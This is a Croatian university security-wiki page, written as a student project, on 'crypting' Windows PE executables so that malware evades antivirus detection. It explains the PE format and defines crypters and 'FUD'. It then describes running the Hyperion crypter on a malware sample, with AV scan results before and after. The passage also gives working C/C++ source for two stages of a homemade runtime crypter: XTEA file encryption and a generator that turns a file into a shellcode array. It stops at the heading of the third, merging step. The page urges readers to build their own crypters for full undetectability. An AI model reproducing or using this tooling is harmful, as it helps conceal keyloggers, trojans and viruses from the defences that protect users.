@@ -1,0 +1,668 @@
+<!DOCTYPE html>
+<html lang="hr" dir="ltr">
+<head>
+<meta charset="UTF-8" />
+<title>Kriptiranje PE-ova - SIS Wiki</title>
+<meta name="generator" content="MediaWiki 1.17.0" />
+<link rel="shortcut icon" href="http://security.foi.hr/favicon.ico" />
+<link rel="search" type="application/opensearchdescription+xml" href="../opensearch_desc.php" title="SIS Wiki (hr)" />
+<link rel="EditURI" type="application/rsd+xml" href="../api.php%3Faction=rsd" />
+<link title="Creative Commons" type="application/rdf+xml" href="http://security.foi.hr/wiki/index.php?title=Kriptiranje_PE-ova&amp;action=creativecommons" rel="meta" />
+<link rel="copyright" href="http://creativecommons.org/licenses/by-sa/3.0/" />
+<link rel="alternate" type="application/atom+xml" title="SIS Wiki Atom izvor" href="../index.php%3Ftitle=Posebno:Nedavne_promjene&amp;feed=atom" />
+<link rel="stylesheet" href="../load.php%3Fdebug=false&amp;lang=hr&amp;modules=mediawiki.legacy.commonPrint%252Cshared%257Cskins.vector&amp;only=styles&amp;skin=vector&amp;*.css" />
+<meta name="ResourceLoaderDynamicStyles" content="" />
+<!--[if lt IE 7]><style type="text/css">body{behavior:url("/wiki/skins/vector/csshover.min.htc")}</style><![endif]--></head>
+<body class="mediawiki ltr ns-0 ns-subject page-Kriptiranje_PE-ova skin-vector">
+		<div id="mw-page-base" class="noprint"></div>
+		<div id="mw-head-base" class="noprint"></div>
+		<!-- content -->
+		<div id="content">
+			<a id="top"></a>
+			<div id="mw-js-message" style="display:none;"></div>
+						<!-- firstHeading -->
+			<h1 id="firstHeading" class="firstHeading">Kriptiranje PE-ova</h1>
+			<!-- /firstHeading -->
+			<!-- bodyContent -->
+			<div id="bodyContent">
+				<!-- tagline -->
+				<div id="siteSub">Izvor: SIS Wiki</div>
+				<!-- /tagline -->
+				<!-- subtitle -->
+				<div id="contentSub"></div>
+				<!-- /subtitle -->
+																<!-- jumpto -->
+				<div id="jump-to-nav">
+					Skoči na: <a href="Kriptiranje_PE-ova.html#mw-head">orijentacija</a>,
+					<a href="Kriptiranje_PE-ova.html#p-search">traži</a>
+				</div>
+				<!-- /jumpto -->
+								<!-- bodytext -->
+				<p><b>Članovi tima</b>: Ivor Šebalj, Tomislav Šulc, Josip Žemberi
+<br />
+<b>Izvorni kod kreiranog kriptera:</b> <a href="http://pastebin.com/2YmLR0Ah" class="external text" rel="nofollow">enkripcija_datoteke_xtea.cpp</a>, <a href="http://pastebin.com/KPTjp6m7" class="external text" rel="nofollow">shellcode_generator.c</a>, <a href="http://pastebin.com/nC6d2cfX" class="external text" rel="nofollow">generator_finalne_datoteke.cpp</a>, <a href="http://pastebin.com/R13qaTeK" class="external text" rel="nofollow">runPE.h</a> --<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Jozemberi&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Jozemberi (stranica ne postoji)">Jozemberi</a> 09:29, 20. siječnja 2013. (CET)
+</p><p><br />
+</p>
+<table id="toc" class="toc"><tr><td><div id="toctitle"><h2>Sadržaj</h2></div>
+<ul>
+<li class="toclevel-1"><a href="Kriptiranje_PE-ova.html#Portable_Executable_tip_datoteka"><span class="tocnumber">1</span> <span class="toctext">Portable Executable tip datoteka</span></a>
+<ul>
+<li class="toclevel-2"><a href="Kriptiranje_PE-ova.html#Povijest_i_razvoj_PE_datoteka"><span class="tocnumber">1.1</span> <span class="toctext">Povijest i razvoj PE datoteka</span></a></li>
+<li class="toclevel-2"><a href="Kriptiranje_PE-ova.html#Najpoznatije_ekstenzije_PE_datoteka"><span class="tocnumber">1.2</span> <span class="toctext">Najpoznatije ekstenzije PE datoteka</span></a>
+<ul>
+<li class="toclevel-3"><a href="Kriptiranje_PE-ova.html#.exe"><span class="tocnumber">1.2.1</span> <span class="toctext">.exe</span></a></li>
+<li class="toclevel-3"><a href="Kriptiranje_PE-ova.html#.dll"><span class="tocnumber">1.2.2</span> <span class="toctext">.dll</span></a></li>
+</ul>
+</li>
+<li class="toclevel-2"><a href="Kriptiranje_PE-ova.html#Prednosti_PE_datoteka"><span class="tocnumber">1.3</span> <span class="toctext">Prednosti PE datoteka</span></a></li>
+<li class="toclevel-2"><a href="Kriptiranje_PE-ova.html#Struktura_PE_tipa_podataka"><span class="tocnumber">1.4</span> <span class="toctext">Struktura PE tipa podataka</span></a></li>
+</ul>
+</li>
+<li class="toclevel-1"><a href="Kriptiranje_PE-ova.html#Prakti.C4.8Dni_dio"><span class="tocnumber">2</span> <span class="toctext">Praktični dio</span></a>
+<ul>
+<li class="toclevel-2"><a href="Kriptiranje_PE-ova.html#Pojmovnik"><span class="tocnumber">2.1</span> <span class="toctext">Pojmovnik</span></a></li>
+<li class="toclevel-2"><a href="Kriptiranje_PE-ova.html#Kripteri_dostupni_na_Internetu"><span class="tocnumber">2.2</span> <span class="toctext">Kripteri dostupni na Internetu</span></a></li>
+<li class="toclevel-2"><a href="Kriptiranje_PE-ova.html#Kreiranje_vlastitog_runtime_kriptera"><span class="tocnumber">2.3</span> <span class="toctext">Kreiranje vlastitog runtime kriptera</span></a>
+<ul>
+<li class="toclevel-3"><a href="Kriptiranje_PE-ova.html#Korak_1:_Enkripcija_datoteke"><span class="tocnumber">2.3.1</span> <span class="toctext">Korak 1: Enkripcija datoteke</span></a>
+<ul>
+<li class="toclevel-4"><a href="Kriptiranje_PE-ova.html#enkripcija_datoteke_xtea.cpp"><span class="tocnumber">2.3.1.1</span> <span class="toctext">enkripcija_datoteke_xtea.cpp</span></a></li>
+</ul>
+</li>
+<li class="toclevel-3"><a href="Kriptiranje_PE-ova.html#Korak_2:_Generiranje_zaglavlja_shellcode.h"><span class="tocnumber">2.3.2</span> <span class="toctext">Korak 2: Generiranje zaglavlja shellcode.h</span></a>
+<ul>
+<li class="toclevel-4"><a href="Kriptiranje_PE-ova.html#shellcode_generator.c"><span class="tocnumber">2.3.2.1</span> <span class="toctext">shellcode_generator.c</span></a></li>
+</ul>
+</li>
+<li class="toclevel-3"><a href="Kriptiranje_PE-ova.html#Korak_3:_Generiranje_kona.C4.8Dne_datoteke_.28spajanje.29"><span class="tocnumber">2.3.3</span> <span class="toctext">Korak 3: Generiranje konačne datoteke (spajanje)</span></a>
+<ul>
+<li class="toclevel-4"><a href="Kriptiranje_PE-ova.html#dat.cpp"><span class="tocnumber">2.3.3.1</span> <span class="toctext">dat.cpp</span></a></li>
+</ul>
+</li>
+<li class="toclevel-3"><a href="Kriptiranje_PE-ova.html#Testiranje_kriptera"><span class="tocnumber">2.3.4</span> <span class="toctext">Testiranje kriptera</span></a></li>
+<li class="toclevel-3"><a href="Kriptiranje_PE-ova.html#Rezultati_AV_online_skenera_za_malware.exe_koji_nije_kriptiran_kreiranim_kripterom"><span class="tocnumber">2.3.5</span> <span class="toctext">Rezultati AV online skenera za malware.exe koji nije kriptiran kreiranim kripterom</span></a></li>
+<li class="toclevel-3"><a href="Kriptiranje_PE-ova.html#Rezultati_AV_online_skenera_za_malware.exe_koji_je_kriptiran_kreiranim_kripterom"><span class="tocnumber">2.3.6</span> <span class="toctext">Rezultati AV online skenera za malware.exe koji je kriptiran kreiranim kripterom</span></a></li>
+<li class="toclevel-3"><a href="Kriptiranje_PE-ova.html#Komentar_rezultata_testiranja_-_zaklju.C4.8Dak"><span class="tocnumber">2.3.7</span> <span class="toctext">Komentar rezultata testiranja - zaključak</span></a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toclevel-1"><a href="Kriptiranje_PE-ova.html#Izvori_literature"><span class="tocnumber">3</span> <span class="toctext">Izvori literature</span></a></li>
+</ul>
+</td></tr></table>
+<h1> <span class="mw-headline" id="Portable_Executable_tip_datoteka">Portable Executable tip datoteka</span></h1>
+<p><br />
+<font style="line-height: 120%;">
+<font size="10">P</font>rije mnogo, mnogo godina u galaksiji daleko, daleko svijetom su vladale „dvaosamšestice“ s Windows 3.1. operativnim sustavom. Win 3.1. se drugim imenom zvao Ianus, po rimskom bogu početaka i promjena. Do sada nije poznata informacija jel sam Ianus od Microsoftovih developera zahtjevao promjene, no one su se svakako dogodile... 
+</p>
+<h3> <span class="mw-headline" id="Povijest_i_razvoj_PE_datoteka">Povijest i razvoj PE datoteka</span></h3>
+<p>1993. godine Windows 3.1. NT (new technology) je napisan, iskodiran ispočetka, ne temeljen na nikakvim zakrpama svojih prethodnika. 
+David Neil Cutler, programer i dizajner, te jedan od glavnih krivaca za tadašnju Windows revoluciju je postavio 3 glavna cilja za nove Windowse:
+</p>
+<ol>
+<li>Portabilnost</li>
+<li>Pouzdanost</li>
+<li>Osobnost</li>
+</ol>
+<p>Značajka portabilnosti je najvažnija za shvatiti. Za razliku od prošlih verzija operativnih sustava koji su bili vezani za samo jednu arhitekturu računala, Windows NT je radio na više arhitektura. Zbog radoznalosti informatičara koji čitaju naš wiki spomenuo sam i preostala dva Cutlerova cilja.
+</p><p>Windows NT upoznao je svijet s novim Portable Executable tipom datoteka, zamjenivši stari COFF (Common Object File Format). PE je mogao biti pokretan na svim verzijama Windowsa i DOS-a. Kako bi čitatelji ovog wikia jasnije shvatili što smatramo Portable Executable tipom datoteke navest ću najpoznatije ekstenzije koje ona sadrži:
+</p>
+<h3> <span class="mw-headline" id="Najpoznatije_ekstenzije_PE_datoteka">Najpoznatije ekstenzije PE datoteka</span></h3>
+<p>.cpl, .exe, .dll, .ocx, .sys, .scr, .drv
+</p>
+<h4> <span class="mw-headline" id=".exe">.exe</span></h4>
+<p>Svi vjerojatno znate za .exe (Executable file) naš svakidašnji uz pomoć kojeg otvarate Far Cry 3, Borderlands 2 ili <del style="color:red;">Call of Duty Modern Warfare 3</del>.
+</p><p>Isprika čitateljima, prekrižit ćemo ovu zadnju newb igru da ne uvrijedimo prave gamere koji čitaju ovaj wiki. 
+Važno je također napomenuti kako .exe može biti i opasan. <b>Nikada</b> nemojte skidati .exe datoteku s interneta ukoliko nevjerujete izvoru s kojeg dolazi, jer to je najlakši način za <b>zaraziti računalo s virusom</b>. 
+</p>
+<h4> <span class="mw-headline" id=".dll">.dll</span></h4>
+<p>Osim .exe tipa datoteke, vjerojatno ste se već upoznali i sa .dll (Dynamic-Link Lybrary). Vrlo vjerojatno kada vam je izbacivao nepoznate errore kako vam fali xxxx.dll datoteka.
+</p>
+<center><a href="http://security.foi.hr/wiki/index.php/Datoteka:Dll_error.jpg" class="image"><img alt="Dll error.jpg" src="../images/4/46/Dll_error.jpg" width="610" height="127" /></a></center>
+<p>Razloga tome ima više, no jedan od najčešćih je da ste izbrisali datoteku koju vaš program ili operativni sustav treba ili se dogodila pogreška prilikom nasnimavanja programa na vaše računalo.
+Zbog čega bi operativni sustavi ili neki program trebao tu .dll datoteku?
+DLL datoteku je moguće zamisliti, baš kao što nam njeno ime predlaže, kao knjižnicu. U toj knjižnici pohranjene su razne knjige, koje u našem slučaju predstavljaju funkcije i podatke. Ukoliko neki program želi znati kako prikazati određenu formu, ili izvršiti nekakvu akciju otiči će do knjižnice i pročitati knjigu u kojoj to piše. DLL datoteka je veoma važna i na nju se oslanjaju jako mnogo aplikacija, a srećom podržava i multitasking pa može svoje resurse djeliti na više različitih mjesta odjednom.
+</p>
+<h3> <span class="mw-headline" id="Prednosti_PE_datoteka">Prednosti PE datoteka</span></h3>
+<p>Jedna od glavnih prednosti PE tipa datoteke u odnosu na prethodni COFF je u tome što je kod nje struktura datoteke na disku jednaka onoj u memoriji. Učitavanje izvršne datoteke u memoriju je samo stvar mapiranja PE datoteke na mjesto gdje je pohranjena adresa. Ključna stvar je u tome što ukoliko ti je poznato kako pronaći nešto u PE podatku, gotovo sigurno tu isto informaciju možeš pronaći kada je podatak učitan u memoriji.
+<br />
+<br />
+<em>"Dobro poznavanje strukture Portable Executable datoteka vodi do dobro razumijevanje operativnog sustava. Ukoliko znaš što ti je u tvojim DLL i EXE datotekama biti ćeš mnogo pametniji programer."</em> - Matt Pietrek, MSDN Magazine, Veljaća 2002. god
+</p>
+<h3> <span class="mw-headline" id="Struktura_PE_tipa_podataka">Struktura PE tipa podataka</span></h3>
+<p>PE tip datoteke organiziran je kao linearni tok podataka. A za one koje žele znati kako je strukturiran može pogledati sliku ispod:
+</p>
+<center><a href="http://security.foi.hr/wiki/index.php/Datoteka:5Wl4CTz.png" class="image"><img alt="5Wl4CTz.png" src="../images/c/c0/5Wl4CTz.png" width="504" height="220" /></a></center>
+<ul><li>MZ-Stub - "Stub" je MS-DOS program koji će ispisati poruku o nemogućnosti izvršavanja programa u DOS operacijskom sustavu ukoliko je program rađen za "višlje" operacijske sustave. Sadrži pokazivač na PE zaglavlje
+</li><li>Magična PE vrijednost - počinje s "P, E, 0x0, 0x0" kako bi se označio kao PE dokument
+</li><li>Slikovno zaglavlje - ima fiksno određenu veličinu i sadrži informacije o podržavanom računalnom procesorskom sklopu
+</li><li>Opcionalno zaglavlje - nije uopće opcionalno i sadrži informacije o veličini izvršnog koda, veličini podataka, polja u koja su zapisana baza slike i veličina slike koja se koriste kod procesa kriptiranja. Isto tako, nalaze se relokacijska, izlazna i ulazna tablica. Pokazivač na ulaznu tablicu pokazuje na listu APIja koji služe u komunikaciji s operacijskim sustavom.
+</li><li>Sekcije - svaka ima svoje vlastito zaglavlje koja sadrže ime, neke zastavice (za pisanje, čitanje), adresu sekcije te veličinu iste.
+</li></ul>
+<p>--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Ivor&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Ivor (stranica ne postoji)">Ivor</a> 22:40, 20. siječnja 2013. (CET)
+</p>
+<h1> <span class="mw-headline" id="Prakti.C4.8Dni_dio">Praktični dio</span></h1>
+<p>Praktični dio ovog rada se sastoji od dva dijela. Prvi u kojem su opisani neki alati za kriptiranje dostupni javno na Internetu te drugog dijela u kojem je implementiran vlastiti runtime kripter. Opisi slijede u nastavku, no prije svega istaknuli smo pojmovnik koji bi vam mogao biti od pomoći u savladavanju slijedećeg teksta.
+</p>
+<h2> <span class="mw-headline" id="Pojmovnik">Pojmovnik</span></h2>
+<ul><li>Crypter - računalni program uz pomoć kojeg korisnik može promijeniti strukturu bilo kojeg virusa, keyloggera, RAT-a (Remote Access Trojan) kako bi taj maliciozni program ostao neprepoznat od antivirusnih programa. Tj. Postao FUD. (<em>pogledaj idući pojam</em>)
+</li><li>FUD - Fully Undetectable, stanje u koje smo doveli maliciozni, a u kojem ga antivirusni program ne prepoznaje kao prijetnju računalu. 
+</li><li>Dijelovi Cryptera:
+</li></ul>
+<ol> 
+<li>Klijent - sučelje u kojem korisnik može kriptirati svoj programski kod. </li>
+<li>Stub - izvršna datoteka (.exe) ili ponekad .dll (objašnjeno dalje u tekstu, ne brini&#160;:] ) koji se koriste kao filter za podatke koji su učitani u klijent dio kriptera. </li>
+</ol>
+<ul><li>Vrste Cryptera:
+</li></ul>
+<ol>
+<li>Vanjski stub - Kripter čija funkcionalnost ovisi o Stub dijelu kriptera. </li>
+<li>Unutarnji stub - Kripter kojem stub nije odvojen od klijenta kao u Vanjskom stub kripteru. </li>
+<li>Runtime - Kripter koji se najčešće koristi za kriptiranje servere, ostaje FUD čak i nakon pokretanja u memoriji računala. </li>
+<li>Scantime - Sličan Runtime kripteru, no prilikom pokretanja u memoriji računala anti-virusni programi ga mogu otkriti.</li>
+</ol>
+<ul><li>Koliko dugo jedan Crypter ostaje FUD - na to pitanje nitko ne može dati točan odgovor, no mišljenja undercover hakera i našeg stručnog SIS tima govore o vremenskom periodu od jednog do tri tjedna. Naravno taj podatak ovisan je o kvaliteti kriptera koji koristite, vašem trudu, vještinama i iskustvu.
+</li><li>Shellcode - mali dio programskog koda koji je korišten kao sadržaj "<a href="http://en.wikipedia.org/wiki/Exploit_(computer_science)" class="external text" rel="nofollow">exploita</a>" koji narušava sigurnost ili stabilnost nekog sustava ili programa određenog operacijskog sustava.
+</li></ul>
+<p>--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Ivor&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Ivor (stranica ne postoji)">Ivor</a> 22:40, 20. siječnja 2013. (CET)
+</p>
+<h2> <span class="mw-headline" id="Kripteri_dostupni_na_Internetu">Kripteri dostupni na Internetu</span></h2>
+<p>U moru kriptera, odabrali smo onaj javno dostupan od strane Nullsec-a [5]. Nazvan Hyperion (po jednom od titana iz Grčke mitologije), na njihovoj stranici se nalazi u source formi, tako da je potrebno prijašnje kompajliranje od strane c/c++ kompajlera. Kako se crypter može izvršavati samo na 32-bitnim operacijskim sustavima, prvo sam na Linux distribuciji (Fedora) instalirao <a href="http://www.mingw.org/" class="external text" rel="nofollow">MinGW</a> skup alata koji omogućavaju kompajliranje koda (C,C++, ObjC++, Fortran) s bilo kojeg operativnog sustava kako bi bio prikladan za izvršavanje u Windows okolini.
+Iz pripadajuće tablice , uzimamo treći poziv C++ kompajlera za win32 okolinu.
+</p>
+<center><a href="http://security.foi.hr/wiki/index.php/Datoteka:Tablica_naredbi_MinGWcrypter.png" class="image"><img alt="Tablica naredbi MinGWcrypter.png" src="../images/1/1e/Tablica_naredbi_MinGWcrypter.png" width="339" height="389" /></a></center>
+<p>Ulaskom u raspakiranu datoteku Hyperion source projekta, vidimo prikazane datoteke. Nama u "Source/Crypter" trebaju potrebne datoteke kako bi od njih napravili crypter. Pozivom već navedene funkcije stvaramo crypter.exe izvršnu datoteku s kojom ćemo kriptirati maliciozni kod (Korišten na labosima).
+</p>
+<center><a href="http://security.foi.hr/wiki/index.php/Datoteka:Fedora_hyperion_kreiranje_cryptera.png" class="image"><img alt="Fedora hyperion kreiranje cryptera.png" src="../images/b/b6/Fedora_hyperion_kreiranje_cryptera.png" width="843" height="518" /></a></center>
+<p>Izvršnu datoteku pokrećemo u win32 okolini (VirtualBox s mountanim WinXP 32bit OS-om). Pokrećemo crypter s parametrima ulazne i izlazne datoteke te dobivamo izvršnu datoteku koja će biti prikrivena. Na taj način dobivamo onu komponentu prikrivenosti datoteke koja skriva neki potencijalni maliciozni kod, a kojeg neće otkriti AV programi i zaštite.
+</p>
+<center><a href="http://security.foi.hr/wiki/index.php/Datoteka:Win32_Hyperion_crypter.png" class="image"><img alt="Win32 Hyperion crypter.png" src="../images/7/71/Win32_Hyperion_crypter.png" width="640" height="352" /></a></center>
+<p>Maliciozni kod prije kriptiranja skeniran od strane <a href="http://vscan.novirusthanks.org/" class="external text" rel="nofollow">Northonovog Virus Scanner-a</a>:
+</p>
+<center><a href="http://security.foi.hr/wiki/index.php/Datoteka:Maliciozni_kod_prijeAV.png" class="image"><img alt="Maliciozni kod prijeAV.png" src="../images/5/5b/Maliciozni_kod_prijeAV.png" width="538" height="310" /></a></center>
+<p>Maliciozni kod poslije kriptiranja:
+</p>
+<center><a href="http://security.foi.hr/wiki/index.php/Datoteka:Maliciozni_kod_poslijeAV.png" class="image"><img alt="Maliciozni kod poslijeAV.png" src="../images/c/cd/Maliciozni_kod_poslijeAV.png" width="599" height="319" /></a></center>
+<p>Čitatelja se potiče na daljnje isprobavanje PE kriptera osim navedenog od Nullsec-a. Neki od trenutno javno dostupnih: <a href="http://itsecuritylab.eu/index.php/2010/09/03/writing-crypter-bypassing-antivirus-how-to-for-beginners/" class="external text" rel="nofollow">Al3ksCrypter</a>, <a href="http://hackerxarena.blogspot.com/2012/06/yodas-crypter.html" class="external text" rel="nofollow">Yoda's Crypter</a>, <a href="http://www.hackforums.net/showthread.php?tid=1227323" class="external text" rel="nofollow">0Crypterv 2.1</a>, <a href="http://www.filecrop.com/X-Crypter-2.0.html" class="external text" rel="nofollow">XCrypter 2.0</a>.--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Tomislav.sulc&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Tomislav.sulc (stranica ne postoji)">Tomislav.sulc</a> 22:25, 20. siječnja 2013. (CET)
+</p><p>Mora vam biti i jasno da su navedeni PE kripteri javno dostupni te se od njih ne može očekivati potpuni FUD. Zbog toga vas potičemo na kreiranje vlastitog runtime kriptera.
+</p><p><br />
+</p>
+<h2> <span class="mw-headline" id="Kreiranje_vlastitog_runtime_kriptera">Kreiranje vlastitog runtime kriptera</span></h2>
+<p>U okviru praktičnog dijela projekta implementirao sam jednostavni runtime kripter u programskom jeziku c/c++. Kripter nije jedna izvršna datoteka već se sastoji od 3 djela/koraka (programa). Prvi služi za enkripciju datoteke koju se želi sakriti od antivirusnog softvera. Drugi služi za generiranje zaglavlja shellcode.h na temelju datoteke koja se dobila u prethodnom koraku (shellcode.h sadrži bajtove kriptirane datoteke zapisane u polje tipa unsigned char u hex formatu). Treći korak je uključivanje shellcode.h zaglavlja u kodu koji će nakon kompajliranja kreirati .EXE datoteku. Radi se o konačnoj datoteci koja će nakon pokretanja dekriptirati kriptiranu datoteku koju smo u drugom koraku spremili u shellcode.h te je izvršiti u radnoj memoriji. 
+--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Jozemberi&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Jozemberi (stranica ne postoji)">Jozemberi</a> 13:53, 19. siječnja 2013. (CET)
+</p>
+<h3> <span class="mw-headline" id="Korak_1:_Enkripcija_datoteke">Korak 1: Enkripcija datoteke</span></h3>
+<p>Enkripcija datoteke koju želimo sakriti od antivirusnog softvera provodi se na način da se pri pokretanju programa za enkripciju u komandnu liniju nakon naziva programa za enkripciju doda naziv (putanja) datoteke koja se želi kriptirati (brži način je napraviti drag &amp; drop datoteke koja se želi kriptirati na .EXE file programa za enkripciju). Program za enkripciju koristi jednostavan XTEA (<em>od eng. Extended Tiny Encryption Algorithm</em>). XTEA je simetrični kriptosustav, poboljšana verzija kriptosustava TEA (<em>od eng. Tiny Encryption Algorithm</em>). Njegove glavne odlike su brzina, jednostavnost i sićušnost. Iako nije najsigurniji kriptosustav, njegove prethodno navedene odlike i činjenica da ga na računalu već imam implementiranog od prije presudili su da za enkripciju koristim baš taj kriptosustav. Sam ključ koji se koristi za enkripciju (i dekripciju) hardkodirani su na odgovarajućim mjestima u programima.
+--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Jozemberi&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Jozemberi (stranica ne postoji)">Jozemberi</a> 13:53, 19. siječnja 2013. (CET)
+</p>
+<h4> <span class="mw-headline" id="enkripcija_datoteke_xtea.cpp"> enkripcija_datoteke_xtea.cpp</span></h4>
+<p><code>
+</p>
+<pre>   /* Ovaj program modifikacija je programa koji sam napravio u kolovozu 2012. 
+    * u okviru završnog rada na temu kriptovirologija.
+    * Svrha programa bila je demonstracija rada XTEA algoritma.
+    * Sam algoritam za sifriranje i desifriranje (funkcije encipher i decipher)
+    * bile si preuzete sa: <a href="http://en.wikipedia.org/wiki/XTEA" class="external free" rel="nofollow">http://en.wikipedia.org/wiki/XTEA</a>
+    *
+    * Datoteka se kriptira na način da se prilikom pokretanja programa iz komandne
+    * linije kao argument navede naziv/putanja datoteke koju se želi kriptirati.
+    * (Datoteka se može kriptirati i na način da se drag &amp; drop-a na .EXE file
+    * ovog programa)
+    *
+    * Autor: Josip Žemberi 
+    * Fakultet Organizacije i Informatike, siječanj 2013.
+    */
+   #include &lt;iostream&gt;
+   #include &lt;fstream&gt;
+   #include &lt;stdint.h&gt;
+   
+   using namespace std;
+   
+   unsigned int kljuc[4]={0xACB5,0x1344,0xEC90,0x285C};              
+   char red[1000];
+   char txt[10000];
+   
+   #define BLOCK_SIZE 8
+   
+   void encipher(unsigned int num_rounds, uint32_t v[2], uint32_t const kljuc[4]){
+       unsigned int i;
+       uint32_t v0=v[0], v1=v[1], sum=0, delta=0x9E3779B9;
+       for (i=0; i &lt; num_rounds; i++){
+           v0 += (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (sum + kljuc[sum &amp; 3]);
+           sum += delta;
+           v1 += (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (sum + kljuc[(sum&gt;&gt;11) &amp; 3]);
+       }
+       v[0]=v0; v[1]=v1;
+   }
+   
+   void decipher(unsigned int num_rounds, uint32_t v[2], uint32_t const kljuc[4]){
+        unsigned int i;
+        uint32_t v0=v[0], v1=v[1], delta=0x9E3779B9, sum=delta*num_rounds;
+        for (i=0; i &lt; num_rounds; i++){
+           v1 -= (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (sum + kljuc[(sum&gt;&gt;11) &amp; 3]);
+           sum -= delta;
+           v0 -= (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (sum + kljuc[sum &amp; 3]);
+        }
+        v[0]=v0; v[1]=v1;
+   }
+   
+   void crypto(char nazivDat[] ,bool naredba){
+         fstream dat(nazivDat,ios::in | ios::out | ios::binary);
+         if(!dat) cout &lt;&lt; "Datoteku nije bilo moguce otvoriti" &lt;&lt; endl;
+   
+         unsigned size;
+       
+         dat.seekg(0,ios::end);
+         size=dat.tellg();
+         dat.seekg(ios::beg);
+       
+         dat.clear();
+       
+         unsigned pos;
+       
+         int n_blocks=size/BLOCK_SIZE;
+         if(size%BLOCK_SIZE!=0)
+             ++n_blocks;
+       
+         for(int i=0;i&lt;n_blocks;i++){
+             unsigned char data[BLOCK_SIZE];
+             pos=dat.tellg();
+         
+             dat.read((char*)data,BLOCK_SIZE);
+         
+             if(naredba) encipher(32,(uint32_t*)data,kljuc);
+             else decipher(32,(uint32_t*)data,kljuc);
+           
+             dat.seekp(pos);
+             dat.write((char*)data,BLOCK_SIZE);
+   
+             memset(data,0,BLOCK_SIZE);
+         }
+         dat.close();
+   }
+   
+   int main(int argc, char *argv[]){
+       if (argc &lt; 2) {
+           fprintf(stderr, "Koristenje:&#160;%s naziv_datoteke_za_enkripciju\n", argv[0]);
+           return 1;
+       }
+       crypto(argv[1], true);
+       cout &lt;&lt; "Datoteka " &lt;&lt; argv[1] &lt;&lt; " je kriptirana!!" &lt;&lt; endl;
+      system("pause");               
+      return 0;
+   }
+</pre>
+<p></code>
+--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Jozemberi&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Jozemberi (stranica ne postoji)">Jozemberi</a> 13:53, 19. siječnja 2013. (CET)
+</p>
+<h3> <span class="mw-headline" id="Korak_2:_Generiranje_zaglavlja_shellcode.h">Korak 2: Generiranje zaglavlja shellcode.h</span></h3>
+<p>Izvorni autor c koda na temelju kojeg sam riješio način generiranja  shellcode-a je Mark Russanovich. (Tako je barem navedeno u README datoteci koja se nalazila uz sam kod). Preuzeti kod sam malo modificirao no logika i funkcionalnost su ostale iste.
+Zaglavlje shellcode.h generira se na temelju datoteke čija je putanja argument komandne linije. U datoteku shellcode.h sprema se proslijeđena datoteka na način da se bajtovi te datoteke u hex obliku dodaju polju shellcode koje je tipa unsigned char te se zatim još zapiše u varijablu tipa unsigned int veličina polja (broj elemenata).
+--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Jozemberi&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Jozemberi (stranica ne postoji)">Jozemberi</a> 13:53, 19. siječnja 2013. (CET)
+</p>
+<h4> <span class="mw-headline" id="shellcode_generator.c">shellcode_generator.c</span></h4>
+<p><code>
+</p>
+<pre>   /* Izvorni autor ovoga koda je Mark Russanovich. (Tako je navedeno u README 
+    * datoteci koja se nalazila uz sam kod).
+    * Preuzeti kod je malo modificiran, no logika i funkcionalnost su ostale iste.
+    *
+    * Zaglavlje shellcode.h se generira na temelju datoteke čija je putanja
+    * argument komandne linije. U datoteku shellcode.h sprema se proslijeđena 
+    * datoteka na način da se bajtovi te datoteke u hex obliku dodaju polju 
+    * shellcode koje je tipa unsigned char.
+    */
+   #include &lt;stdio.h&gt;
+   #include &lt;stdlib.h&gt;
+   
+   int main(int argc, char *argv[]){
+   
+       FILE *f; 
+       int i, c;
+       char *arr_name;
+   	
+       if (argc &lt; 2) {
+           fprintf(stderr, "Koristenje:&#160;%s naziv_kriptirane_datoteke\n", argv[0]);
+           return 1;
+       }
+   	
+       f = fopen(argv[1], "rb");
+       if (f == NULL) {
+           fprintf(stderr, "%s: fopen(%s) nije uspio", argv[0], argv[1]);
+           return 1;
+       }
+   
+   	
+   	freopen ("shellcode.h","w",stdout);
+       
+       arr_name = "shellcode";
+       
+       printf("unsigned char&#160;%s[] = {", arr_name);
+   
+       for (i=0;;i++) {
+           if ((c = fgetc(f)) == EOF) break;
+           if (i&#160;!= 0) printf(",");
+           if ((i&#160;% 12) == 0) printf("\n\t");
+           printf("0x%.2X", (unsigned char)c);
+       }
+   
+       printf("\n\t};\n");	
+       
+   	printf("unsigned int size =&#160;%i;\n", i);
+       
+       fclose(f);
+   	fclose(stdout);
+   	
+       return 0;
+   }
+</pre>
+<p></code>
+--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Jozemberi&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Jozemberi (stranica ne postoji)">Jozemberi</a> 13:53, 19. siječnja 2013. (CET)
+</p>
+<h3> <span class="mw-headline" id="Korak_3:_Generiranje_kona.C4.8Dne_datoteke_.28spajanje.29">Korak 3: Generiranje konačne datoteke (spajanje)</span></h3>
